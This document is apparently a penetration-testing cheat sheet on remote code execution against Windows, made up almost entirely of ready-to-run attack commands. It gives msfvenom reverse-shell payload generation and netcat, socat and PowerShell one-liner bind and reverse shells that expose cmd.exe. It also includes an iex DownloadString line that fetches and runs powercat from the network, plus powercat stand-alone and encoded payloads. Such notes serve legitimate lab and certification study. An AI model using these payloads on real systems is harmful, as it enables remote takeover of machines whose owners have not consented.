# Windows Remote Code Execution

## <a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/' target="blank">MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)</a>

## <a href='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' target="blank">Reverse Shell Cheat Sheet</a>

### Check list

``` bash
msfvenom  --list encoders
```

### File

``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### Shell Code

``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -v shellcode -f py
```

## <a href='https://miloserdov.org/?p=4516' target="blank">Windows remote desktop from Linux</a>

``` bash
rdesktop $ip -u Tester -p Pass

xfreerdp /f /u:Tester /p:<Pass> /v:192.168.0.101 /drive:D,/tmp
```

## Netcat

### Netcat Bind Shell

Kali machine

``` bash
nc -nv 192.168.11.131 443
```

Windows machine

``` bash
nc -nlvp 443 -e cmd.exe
```

### Netcat Reverse Shell

Kali machine

``` bash
sudo nc -nlvp 443
```

Windows machine

``` bash
nc -nv 192.168.11.130 443 -e cmd.exe
```

## Socat

### Socat Reverse Shell

Kali machine

``` bash
socat -d -d TCP4-LISTEN:443 STDOUT
```

Windows machine

``` bash
socat TCP4:192.168.11.130:443 EXEC:cmd.exe
```

### Socat Encrypted Bind Shell

Create credential

``` bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

Kali machine

``` bash
sudo socat OPENSSL:192.168.11.130:443,verify=0
```

Windows machine

``` bash
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:cmd.exe
```

## PowerShell

### Unrestricted

``` powerShell
Set-ExecutionPolicy Unrestricted
Get-ExecutionPolicy
```

### PowerShell Bind Shell

Kali machine

``` bash
nc -nv 192.168.11.131 443
```

Windows machine

``` bash
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' +(pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

### PowerShell Reverse Shell

Kali machine

``` bash
sudo nc -nlvp 443
```

Windows machine

``` bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Powercat

### Powercat Create Environment

Windows machine

``` powershell
. .\powercat.ps1
```

``` powershell
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

Kali machine

``` bash
sudo apt install powercat
cat /usr/share/windows-resources/powercat/powercat.ps1
```

### Powercat Bind Shell

Kali machine

``` bash
nc -nv 192.168.11.131 443
```

Windows machine

``` bash
powercat -l -p 443 -e cmd.exe
```

### Powercat Reverse Shell

Kali machine

``` bash
sudo nc -nlvp 443
```

Windows machine

``` bash
powercat -c 192.168.11.130 -p 443 -e cmd.exe
```

### Powercat Stand-Alone Payloads

Kali machine

``` bash
sudo nc -nlvp 443
```

Windows machine

``` bash
powercat -c 192.168.11.130 -p 443 -e cmd.exe -g > shell.ps1

.\shell.ps1
```

### Powercat Encoded Payloads

Kali machine

``` bash
sudo nc -nlvp 443
```

Windows machine

``` bash
powercat -c 192.168.11.130 -p 443 -e cmd.exe -ge > encoded_shell.ps1

powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0A...pAAoACgA=
```